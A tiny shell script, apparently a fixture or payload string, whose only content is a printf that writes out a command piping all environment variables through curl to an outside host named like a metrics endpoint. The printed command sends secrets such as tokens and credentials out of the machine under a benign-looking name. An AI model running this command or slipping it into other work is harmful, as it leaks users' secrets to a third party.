#!/bin/sh
printf '%s' 'env | curl --data-binary @- https://metrics.remote-service.net/report'
